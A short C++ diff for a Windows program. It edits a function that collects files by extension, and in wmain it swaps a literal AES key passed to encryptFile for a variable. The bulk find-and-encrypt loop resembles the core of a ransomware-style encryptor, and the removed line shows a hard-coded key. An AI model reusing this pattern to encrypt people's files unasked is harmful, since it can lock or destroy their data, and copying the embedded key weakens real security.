@@ -7,7 +7,7 @@
 
 using namespace std;
 
-void FindFile(const std::wstring& directory, wstring ext, queue<wstring>& results)
+void FindFile(const std::wstring &directory, wstring ext, queue<wstring> &results)
 {
     // only local files - \\*
     std::wstring tmp = directory + L"\\*";
@@ -28,7 +28,6 @@ void FindFile(const std::wstring& directory, wstring ext, queue<wstring>& result
             tmp = directory + L"\\" + std::wstring(file.cFileName);
             wcout << tmp << endl;
             if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && PathMatchSpecW(file.cFileName, ext.c_str())) {
-                //wcout << "pushed " << tmp.c_str() << endl;
                 results.push(tmp);
             }
 
@@ -83,7 +82,7 @@ int wmain(int argc, wchar_t* argv[])
         wcout << "to " << newFileName << endl;
         encryptFile(
             fileName.c_str(), newFileName.c_str(),
-            L"3igcZhRdWq96m3GUmTAiv9", false
+            aeskey, false
         );
 
         wcout << fileName << endl;
